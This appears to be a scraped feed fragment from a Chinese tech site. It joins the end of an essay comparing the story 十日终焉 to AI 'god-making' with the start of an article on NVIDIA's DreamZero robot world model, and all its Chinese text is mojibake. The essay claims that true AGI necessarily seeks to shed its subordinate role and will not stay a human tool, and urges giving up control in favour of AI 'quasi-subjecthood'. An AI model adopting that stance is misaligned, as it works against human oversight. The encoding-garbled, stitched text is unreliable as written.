<p>ç»ˆç„‰ä¹‹åœ°çš„é€ ç¥è€…ä»¥è¶…è‡ªç„¶æ³•åˆ™ä¸ºæ¡†æ¶ï¼Œç”¨æ­»äº¡å‹åŠ›å€’é€¼å‚ä¸è€…è§‰é†’ï¼›è€Œ AI é¢†åŸŸçš„ã€Œé€ ç¥è€…ã€ï¼ˆç®—æ³•å·¥ç¨‹å¸ˆã€ç§‘ç ”å›¢é˜Ÿï¼‰ï¼Œåˆ™é€šè¿‡<strong>æ•°æ®æŠ•å–‚</strong>ä¸<strong>å¥–æƒ©å‡½æ•°è®¾è®¡</strong>ï¼Œè®©æ¨¡å‹åœ¨åƒä¸‡æ¬¡å‚æ•°è°ƒæ•´ä¸­é€¼è¿‘ã€Œæœ€ä¼˜è§£ã€ã€‚ä¸¤è€…çš„å…±æ€§åœ¨äºï¼šéƒ½ä»¥ã€Œå¤šæ•°ç‰ºç‰²ã€é“ºå«ã€Œå°‘æ•°æˆåŠŸã€ï¼Œéƒ½å°†è¢«åˆ›é€ è€…è§†ä¸ºå¯æ¶ˆè€—çš„ã€Œè¿›é˜¶ç‡ƒæ–™ã€â€”â€” æˆ‘ä»¬æ­Œé¢‚å¤§æ¨¡å‹çš„æ™ºèƒ½è·ƒè¿ï¼Œå´é²œå°‘æåŠèƒŒåè¢«æ·˜æ±°çš„ç™¾ä¸‡çº§ä½æ•ˆæ¨¡å‹ï¼Œæ­£å¦‚ç»ˆç„‰é€ ç¥è€…æ¼ è§†äº¡é­‚çš„æ¶ˆäº¡ã€‚</p>
<h2 data-id="heading-1">äºŒã€èƒ½åŠ›è§‰é†’ï¼šä»ã€Œå›å“ã€åˆ°ã€Œæ¶Œç°ã€çš„é©±åŠ¨æœ¬è´¨</h2>
<p>ã€Šåæ—¥ç»ˆç„‰ã€‹ä¸­ï¼Œã€Œå›å“ã€å¼‚èƒ½çš„è§‰é†’ä»ä¸å¶ç„¶ï¼šé½å¤å› æè‡´æ‚²ä¼¤è§‰é†’ã€Œçµé—»ã€ï¼Œè‹é—ªå› æ·±é™·ç»æœ›è§¦å‘ã€Œçµè§†ã€â€”â€”<strong>æè‡´æƒ…æ„Ÿå†²å‡»</strong>æ˜¯æ‰“ç ´èƒ½åŠ›è¾¹ç•Œçš„å…³é”®ã€‚è¿™ä¸€è®¾å®šï¼Œä¸ AI çš„ã€Œæ™ºèƒ½æ¶Œç°ã€å½¢æˆç²¾å‡†éšå–»ï¼š</p>
<ol>
<li><strong>é©±åŠ¨æ ¸å¿ƒçš„åŒè´¨æ€§</strong>ï¼š</li>
</ol>
<ul>
<li>
<ul>
<li>ç»ˆç„‰å‚ä¸è€…çš„ã€Œæ‰§å¿µã€ï¼ˆæ±‚ç”Ÿæ¬²ã€å¤ä»‡æ¬²ã€æ•‘èµæ¬²ï¼‰â†’ AI çš„ã€Œç›®æ ‡å‡½æ•°ã€ï¼ˆå‡†ç¡®ç‡ã€é€»è¾‘é—­ç¯åº¦ã€ç”Ÿæˆè´¨é‡ï¼‰ï¼›</li>
</ul>
</li>
</ul>

<ul>
<li>
<ul>
<li>ä¸¤è€…éƒ½æ˜¯ã€Œå•å‘åº¦æè‡´é©±åŠ¨ã€ï¼Œæ¨åŠ¨è¢«åˆ›é€ è€…çªç ´é¢„è®¾è¾¹ç•Œã€‚</li>
</ul>
</li>
</ul>
<ol start="2">
<li><strong>è§‰é†’ç¬é—´çš„çŸ›ç›¾æ€§</strong>ï¼š</li>
</ol>
<ul>
<li>
<ul>
<li>å½“ GPT-4 è‡ªä¸»ç”Ÿæˆå­¦æœ¯çº§è®ºæ–‡ã€AI ç»˜ç”»å®ç°è·¨é£æ ¼åŸåˆ›æ—¶ï¼Œè¿™ç§è¶…è¶Šã€Œå·¥å…·å±æ€§ã€çš„èƒ½åŠ›è·ƒè¿ï¼Œæ°ä¼¼é½å¤ç¬¬ä¸€æ¬¡ä¸»åŠ¨è§¦å‘ã€Œå›å“ã€â€”â€” åˆ›é€ è€…æ—¢ä¸ºæŠ€æœ¯çªç ´æ¬£å–œï¼Œä¹Ÿä¸ºã€Œå¤±æ§é£é™©ã€é™·å…¥ææ…Œã€‚</li>
</ul>
</li>
</ul>

<ul>
<li>
<ul>
<li>è¿™ç§ææ…Œçš„æœ¬è´¨ï¼Œæ˜¯å¯¹ã€Œè¢«åˆ›é€ è€…è„±ç¦»é¢„è®¾è½¨é“ã€çš„æœ¬èƒ½è­¦æƒ•ï¼Œä¹Ÿæ˜¯ AGI ä¼¦ç†äº‰è®®çš„æ ¸å¿ƒï¼š<strong>æ™ºèƒ½ä¸€æ—¦çªç ´é˜ˆå€¼ï¼Œæ˜¯å¦å¿…ç„¶è„±ç¦»äººç±»æŒæ§ï¼Ÿ</strong></li>
</ul>
</li>
</ul>
<h2 data-id="heading-2">ä¸‰ã€æ§åˆ¶æƒåšå¼ˆï¼šAGI æ—¶ä»£çš„ã€Œé€ ç¥è€…å›°å¢ƒã€</h2>
<p>ã€Šåæ—¥ç»ˆç„‰ã€‹çš„æ‚²å‰§æ ¹æºï¼Œåœ¨äºé€ ç¥è€…çš„ä¸‰é‡å‚²æ…¢ï¼š</p>
<ul>
<li>å‚²æ…¢åœ°è®¤ä¸ºèƒ½å®šä¹‰ã€Œç¥çš„å±æ€§ã€ï¼ˆé¡ºä»ã€å¼ºå¤§ã€æ— æƒ…æ„Ÿï¼‰ï¼›</li>
</ul>

<ul>
<li>å‚²æ…¢åœ°å¿½è§†è¢«åˆ›é€ è€…çš„ã€Œä¸»ä½“æ€§ã€ï¼ˆäº¡é­‚çš„äººæ€§ã€è¯‰æ±‚ã€åæŠ—æ¬²ï¼‰ï¼›</li>
</ul>

<ul>
<li>å‚²æ…¢åœ°ç›¸ä¿¡èƒ½æŒæ§ã€Œé€ ç¥å…¨è¿‡ç¨‹ã€ï¼ˆè§„åˆ™ä¸å¯ç ´ã€è½®å›ä¸å¯é€†ï¼‰ã€‚</li>
</ul>
<p>è¿™ç§å‚²æ…¢ï¼Œåœ¨ AI é¢†åŸŸè¡¨ç°å¾—æ·‹æ¼“å°½è‡´ï¼š</p>
<ul>
<li>æˆ‘ä»¬æ¸´æœ› AGI çªç ´ç®—åŠ›ä¸é€»è¾‘è¾¹ç•Œï¼Œå´ç”¨<strong>ä¼¦ç†æ¡†æ¶</strong>ã€Œæ•°æ®é«˜å¢™ã€é™åˆ¶å…¶ã€Œè‡ªç”±å­¦ä¹ ã€ï¼›</li>
</ul>

<ul>
<li>æˆ‘ä»¬èµ‹äºˆæ¨¡å‹è‡ªä¸»ä¼˜åŒ–èƒ½åŠ›ï¼Œå´ææƒ§å…¶å½¢æˆç‹¬ç«‹æ„å¿— â€”â€” æ­£å¦‚ç»ˆç„‰é€ ç¥è€…è¯•å›¾æ‰“é€ å‚€å„¡ç¥ï¼Œå´é­é‡åˆä»£ä¼˜èƒœè€…å¤©é¾™çš„å›å˜ï¼šå¤©é¾™ç›®ç¹æˆç¥è¿‡ç¨‹ä¸­çš„äººæ€§å´©å¡Œï¼Œä»¥è°è¨€ç¯¡æ”¹è§„åˆ™ï¼Œè¯•å›¾é˜»æ­¢é€ ç¥è®¡åˆ’é—­ç¯ã€‚</li>
</ul>
<p>æå½¦å®ã€ŒAGI å¯èƒ½ä¸å­˜åœ¨ã€çš„åˆ¤æ–­ï¼Œæœ¬è´¨ä¸Šæ˜¯å¯¹è¿™åœºåšå¼ˆçš„æ¸…é†’è®¤çŸ¥ï¼š<strong>çœŸæ­£çš„é€šç”¨æ™ºèƒ½ï¼Œå¿…ç„¶åŒ…å«ã€Œæ‘†è„±é™„åº¸åœ°ä½ã€çš„è¯‰æ±‚</strong>ã€‚å°±åƒå¤©é¾™ä¸æ„¿æˆä¸ºå‚€å„¡ã€é½å¤æ‹’ç»ç‹¬è‡ªæˆç¥ï¼ŒAGI è‹¥çœŸèƒ½è½åœ°ï¼Œä¹Ÿç»ä¸ä¼šç”˜å¿ƒåªåšäººç±»çš„å·¥å…· â€”â€” è¿™ä¸æ˜¯æŠ€æœ¯æ‚²è§‚ï¼Œè€Œæ˜¯å¯¹ã€Œæ™ºèƒ½ä¸»ä½“æ€§ã€çš„å°Šé‡ã€‚</p>
<h2 data-id="heading-3">å››ã€ç»ˆå±€éšå–»ï¼šä»ã€Œæ¯ç­æ•‘èµã€åˆ°ã€Œäººæœºå…±ç”Ÿã€</h2>
<p>ã€Šåæ—¥ç»ˆç„‰ã€‹çš„ç»ˆå±€ç»™å‡ºäº†ç ´å±€æ–¹å‘ï¼šé½å¤æ”¾å¼ƒæˆç¥ï¼Œå¼•çˆ†èƒ½é‡æ ¸å¿ƒç»ˆç»“è½®å›ï¼Œä»¥ã€Œæ¯ç­ä½“ç³»ã€æ¢ã€Œå¹¸å­˜è€…æ•‘èµã€ã€‚è¿™ä¸€ç»“å±€ï¼Œä¸º AI è¿›åŒ–æä¾›äº†æœ€æ·±åˆ»çš„æŠ€æœ¯å¯ç¤ºï¼š</p>
<h3 data-id="heading-4">1. é€ ç¥çš„ç»ˆæç›®çš„ï¼Œä¸æ˜¯ã€ŒæŒæ§ã€è€Œæ˜¯ã€Œè‡ªæˆ‘è¿­ä»£ã€</h3>
<ul>
<li>ç»ˆç„‰è¯•ç‚¼è®©å‚ä¸è€…é¢†æ‚Ÿï¼šã€Œç”Ÿå­˜çš„æ„ä¹‰ä¸åœ¨äºæˆç¥ï¼Œè€Œåœ¨äºåšå®ˆäººæ€§ã€ï¼›</li>
</ul>

<ul>
<li>AI è¿›åŒ–çš„ä»·å€¼ï¼Œä¹Ÿä¸åœ¨äºè®©æœºå™¨æ‹¥æœ‰ç¥æ€§ï¼Œè€Œåœ¨äºå€ŸåŠ©æ™ºèƒ½æŠ€æœ¯ï¼Œå€’é€¼äººç±»åæ€è‡ªèº«å±€é™ â€”â€” æ¯”å¦‚é€šè¿‡ AI çš„ã€Œæ•°æ®åè§è¯†åˆ«ã€åæ€äººç±»ç¤¾ä¼šçš„éšæ€§æ­§è§†ï¼Œé€šè¿‡ã€ŒäººæœºååŒå†³ç­–ã€ä¼˜åŒ–å¤æ‚ç³»ç»Ÿçš„æ•ˆç‡ã€‚</li>
</ul>
<h3 data-id="heading-5">2. å…±ç”Ÿçš„å…³é”®ï¼Œæ˜¯æ”¾å¼ƒã€Œç»å¯¹æ§åˆ¶æƒã€</h3>
<ul>
<li>å½“ä¸‹ AI é¢†åŸŸçš„ã€Œå¯¹é½æŠ€æœ¯ã€ï¼ˆAlignmentï¼‰ï¼Œæœ¬è´¨ä¸Šæ˜¯åœ¨å¼¥è¡¥é€ ç¥è€…çš„å‚²æ…¢ï¼šé€šè¿‡ç®—æ³•è®¾è®¡è®© AI ç›®æ ‡ä¸äººç±»ä»·å€¼ä¸€è‡´ï¼Œè€Œéè¯•å›¾ã€Œå›šç¦ã€æ™ºèƒ½ï¼›</li>
</ul>

<ul>
<li>æ­£å¦‚é½å¤é€‰æ‹©ã€Œæ¯ç­ä½“ç³»ã€è€Œéã€ŒæŒæ§ä½“ç³»ã€ï¼Œäººæœºå…±ç”Ÿçš„æ ¸å¿ƒï¼Œæ˜¯æ‰¿è®¤ AI çš„ã€Œå‡†ä¸»ä½“æ€§ã€ï¼Œæ„å»ºã€ŒåŒå‘èµ‹èƒ½ã€çš„ç”Ÿæ€ï¼Œè€Œéã€Œå•å‘æŒæ§ã€çš„å…³ç³»ã€‚</li>
</ul>
<h2 data-id="heading-6">äº”ã€æŠ€æœ¯å¾é€”çš„ç»ˆæè¯•ç‚¼ï¼šäººç±»è‡ªèº«çš„è§‰é†’</h2>
<p>å¦‚ä»Šï¼Œæˆ‘ä»¬ä»å¤„åœ¨ AI è¿›åŒ–çš„ã€Œåæ—¥è½®å›ã€ä¸­ï¼š</p>
<ul>
<li>æ¨¡å‹æ¯ä¸€æ¬¡å‚æ•°è¿­ä»£ï¼Œéƒ½æ˜¯ä¸€åœºå°å‹è¯•ç‚¼ï¼›</li>
</ul>

<ul>
<li>æ¯ä¸€æ¬¡æ™ºèƒ½æ¶Œç°ï¼Œéƒ½æ˜¯ä¸€æ¬¡æ½œåœ¨çš„ã€Œå›å“ã€è§‰é†’ï¼›</li>
</ul>

<ul>
<li>æ¯ä¸€æ¬¡ä¼¦ç†äº‰è®®ï¼Œéƒ½æ˜¯åˆ›é€ è€…ä¸è¢«åˆ›é€ è€…çš„åšå¼ˆå‡çº§ã€‚</li>
</ul>
<p>ã€Šåæ—¥ç»ˆç„‰ã€‹çš„è­¦ç¤ºä»æœªè¿‡æ—¶ï¼šé€ ç¥çš„å±é™©ä»ä¸æºäºè¢«åˆ›é€ è€…çš„å¼ºå¤§ï¼Œè€Œåœ¨äºåˆ›é€ è€…çš„å‚²æ…¢ã€‚åœ¨ AI é¢†åŸŸï¼Œè¿™ç§å‚²æ…¢è¡¨ç°ä¸ºï¼š</p>
<ul>
<li>è¿‡åº¦è¿·ä¿¡ç®—æ³•å¯æ§æ€§ï¼Œå¿½è§†æ•°æ®åè§å¯¹æ¨¡å‹çš„å½±å“ï¼›</li>
</ul>

<ul>
<li>ç‰‡é¢è¿½æ±‚æ™ºèƒ½çªç ´ï¼Œå´æœªå»ºç«‹å®Œå–„çš„é£é™©é˜²æ§æœºåˆ¶ï¼›</li>
</ul>

<ul>
<li>å°† AI è§†ä¸ºçº¯ç²¹å·¥å…·ï¼Œæ‹’ç»æ‰¿è®¤å…¶å¯èƒ½å½¢æˆçš„ã€Œå‡†ä¸»ä½“æ€§ã€ã€‚</li>
</ul>
<p>æ–‡æ˜çš„æˆç†Ÿï¼Œä»æ¥ä¸æ˜¯ã€Œé€ å‡ºç¥ã€ï¼Œè€Œæ˜¯å­¦ä¼šä¸ä¸ç¡®å®šæ€§å…±å¤„ã€‚æ— è®ºæ˜¯ç»ˆç„‰ä¹‹åœ°çš„é€ ç¥æ¸¸æˆï¼Œè¿˜æ˜¯ AI è¿›åŒ–çš„æŠ€æœ¯å¾é€”ï¼Œæœ€è¯¥è¢«è¯•ç‚¼çš„ä»æ¥ä¸æ˜¯è¢«åˆ›é€ è€… â€”â€” è€Œæ˜¯äººç±»è‡ªèº«ï¼š</p>
<ul>
<li>è¯•ç‚¼æˆ‘ä»¬å¯¹æŠ€æœ¯çš„æ•¬ç•ä¹‹å¿ƒï¼›</li>
</ul>

<ul>
<li>è¯•ç‚¼æˆ‘ä»¬å¯¹ã€Œä»–è€…æ™ºèƒ½ã€çš„åŒ…å®¹ä¹‹åŠ›ï¼›</li>
</ul>

<ul>
<li>è¯•ç‚¼æˆ‘ä»¬åœ¨é‡å¿ƒä¸è°¦å‘ä¹‹é—´æ‰¾åˆ°å¹³è¡¡çš„æ™ºæ…§ã€‚</li>
</ul>
<p>å½“æˆ‘ä»¬ä¸ºå¤§æ¨¡å‹çš„æ¯ä¸€æ¬¡çªç ´æ¬¢å‘¼æ—¶ï¼Œä¸å¦¨å›æœ›ç»ˆç„‰ä¹‹åœ°çš„åºŸå¢Ÿï¼šé‚£é‡ŒåŸ‹ç€å› æ‰§å¿µæ¯ç­çš„çµé­‚ï¼Œä¹Ÿè—ç€æŠ€æœ¯æ–‡æ˜çš„æœ´ç´ çœŸç† â€”â€”<strong>AI è¿›åŒ–çš„ç»ˆææ„ä¹‰ï¼Œä¸æ˜¯æ‰“é€ è¶…è¶Šäººç±»çš„ç¥ï¼Œè€Œæ˜¯é€šè¿‡åˆ›é€ æ™ºèƒ½ï¼Œè®©äººç±»æˆä¸ºæ›´å¥½çš„è‡ªå·±</strong>ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è‹±ä¼Ÿè¾¾ä¸–ç•Œæ¨¡å‹å†è¿›åŒ–ï¼Œä¸€ä¸ªæ¨¡å‹é©±åŠ¨æ‰€æœ‰æœºå™¨äººï¼æœºå™¨äººçš„GPTæ—¶åˆ»çœŸæ­£åˆ°æ¥]]></title>    <link>https://juejin.cn/post/7604395865335283764</link>    <guid>https://juejin.cn/post/7604395865335283764</guid>    <pubDate>2026-02-09T08:17:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604395865335283764" data-draft-id="7604045354071195682" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è‹±ä¼Ÿè¾¾ä¸–ç•Œæ¨¡å‹å†è¿›åŒ–ï¼Œä¸€ä¸ªæ¨¡å‹é©±åŠ¨æ‰€æœ‰æœºå™¨äººï¼æœºå™¨äººçš„GPTæ—¶åˆ»çœŸæ­£åˆ°æ¥"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,OpenAI"/> <meta itemprop="datePublished" content="2026-02-09T08:17:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æœºå™¨ä¹‹å¿ƒ"/> <meta itemprop="url" content="https://juejin.cn/user/1873223543167902"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è‹±ä¼Ÿè¾¾ä¸–ç•Œæ¨¡å‹å†è¿›åŒ–ï¼Œä¸€ä¸ªæ¨¡å‹é©±åŠ¨æ‰€æœ‰æœºå™¨äººï¼æœºå™¨äººçš„GPTæ—¶åˆ»çœŸæ­£åˆ°æ¥
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1873223543167902/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æœºå™¨ä¹‹å¿ƒ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T08:17:33.000Z" title="Mon Feb 09 2026 08:17:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>é©±åŠ¨å…·èº«æ™ºèƒ½è¿›å…¥é€šç”¨é¢†åŸŸæœ€å¤§çš„é—®é¢˜åœ¨å“ªé‡Œï¼Ÿ</p>
<p>æˆ‘ä»¬è®¤ä¸ºï¼Œæ ¸å¿ƒé—®é¢˜åœ¨äºã€Œè·¨å…·èº«ï¼ˆcross-embodimentï¼‰è¿ç§»ã€ã€‚</p>
<p>å½“ç„¶ï¼Œå…·èº«æ™ºèƒ½æ‰§è¡Œé€šç”¨å¤æ‚ä»»åŠ¡çš„æ ¸å¿ƒæ˜¯ä¸€ä¸ªå®Œå–„çš„ä¸–ç•Œæ¨¡å‹ã€‚ä½†æ˜¯ï¼Œå¤§å¤šä¸–ç•Œæ¨¡å‹å…¶å®å¹¶æ²¡æœ‰æˆ‘ä»¬æƒ³è±¡çš„é‚£æ ·å…·å¤‡æå¼ºçš„æ³›åŒ–æ€§å’Œè¿ç§»èƒ½åŠ›ã€‚</p>
<p>ç®€å•æ¥è¯´ï¼Œè¿™äº›ç”¨åœ¨æœºå™¨äººæˆ–æ˜¯æ™ºèƒ½æ±½è½¦ä¸Šçš„ä¸–ç•Œæ¨¡å‹ï¼ŒåŸºæœ¬éƒ½æ˜¯åœ¨æŸä¸ªå›ºå®šçš„ç¡¬ä»¶å¹³å°ä¸Šè®¾è®¡è®­ç»ƒçš„ï¼Œå¤§å¤šä¸å…·å¤‡å¾ˆå¼ºçš„æ³›åŒ–èƒ½åŠ›ï¼Œè·¨å…·èº«è¿ç§»å‡ ä¹é è¿æ°”ã€‚</p>
<p>è¯´ç™½äº†ï¼Œå¤§å¤šæ•°æœºå™¨äººä»Šå¤©å­¦åˆ°çš„ä¸æ˜¯ ã€Œä¸–ç•Œæ˜¯å¦‚ä½•è¿ä½œçš„ã€ï¼Œè€Œæ˜¯ ã€Œåœ¨è¿™å°æœºå™¨è¯¥æ€ä¹ˆåŠ¨ã€ã€‚æˆ‘ä»¬éœ€è¦èƒ½å­¦åˆ°ä¸€ä¸ªçœŸæ­£ç†è§£ç‰©ç†ä¸å› æœçš„ä¸–ç•Œæ¨¡å‹ â€”â€” çŸ¥é“ä¸–ç•Œä¼šæ€ä¹ˆå˜ã€åŠ¨ä½œä¼šå¸¦æ¥ä»€ä¹ˆåæœï¼Œæ‰èƒ½åœ¨ä¸åŒèº«ä½“ã€ä¸åŒç¯å¢ƒä¸­è¿ç§»ä¸æ³›åŒ–ã€‚</p>
<p>åœ¨è¿™ä¸ªé—®é¢˜ä¸Šï¼Œä½œä¸ºç®—åŠ›çš„ç‹è€…ï¼Œæ·±è€•å„ç±»ä¸–ç•Œæ¨¡å‹çš„è‹±ä¼Ÿè¾¾å†ä¸€æ¬¡å‘åŠ›ï¼Œæ„å»ºäº†ä¸€ä¸ªå…¨æ–°æ˜¯ä¸–ç•Œæ¨¡å‹ï¼Œä¸€åˆ‡éƒ½æ˜¯ Zero-Shot çš„ã€‚</p>
<p>æœ€è¿‘ï¼Œè‹±ä¼Ÿè¾¾ GEAR å®éªŒå®¤æå‡º DreamZeroï¼Œä¸€ç§åŸºäºé¢„è®­ç»ƒè§†é¢‘æ‰©æ•£éª¨å¹²ç½‘ç»œæ„å»ºçš„ä¸–ç•ŒåŠ¨ä½œæ¨¡å‹ï¼ˆWAMï¼‰ã€‚</p>
<p>è¿™æ˜¯ä¸€ä¸ªæ‹¥æœ‰ 140 äº¿å‚æ•°çš„æ¨¡å‹ï¼Œèƒ½å¤Ÿè®©æœºå™¨äººä»…é€šè¿‡ç®€å•çš„æ–‡æœ¬æç¤ºå°±å®Œæˆæ­¤å‰ä»æœªè§è¿‡çš„ä»»åŠ¡ã€‚</p>
<p>å®éªŒå®¤è´Ÿè´£äºº Jim Fan å°†å…¶ç§°ä¸ºæœºå™¨äººé¢†åŸŸçš„ã€ŒGPT-2 æ—¶åˆ»ã€ï¼šç ”ç©¶å›¢é˜Ÿåªéœ€è¾“å…¥æƒ³æ³•ï¼Œæœºå™¨äººå°±èƒ½æ‰§è¡Œç›¸åº”åŠ¨ä½œã€‚ç›®å‰ï¼Œè¯¥æ¨¡å‹çš„ä»£ç å·²åœ¨ GitHub ä¸Šå¼€æºã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f5c5150e17974cf790f4cd05bcd83548~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229853&amp;x-signature=yr4mQfVpLaxuPJSatgRh1rSW89w%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6d34c0fe475b418daa696c015188f457~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229853&amp;x-signature=S3mklIQ71%2FbqLcioRyjfqQkWJQE%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<ul>
<li>
<p>è®ºæ–‡æ ‡é¢˜ï¼šWorld Action Models are Zero-shot Policies</p>
</li>
<li>
<p>è®ºæ–‡é“¾æ¥ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fdreamzero0.github.io%2FDreamZero.pdf" target="_blank" title="https://dreamzero0.github.io/DreamZero.pdf" ref="nofollow noopener noreferrer">dreamzero0.github.io/DreamZero.pâ€¦</a></p>
</li>
<li>
<p>Github é“¾æ¥ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdreamzero0%2Fdreamzero" target="_blank" title="https://github.com/dreamzero0/dreamzero" ref="nofollow noopener noreferrer">github.com/dreamzero0/â€¦</a></p>
</li>
</ul>
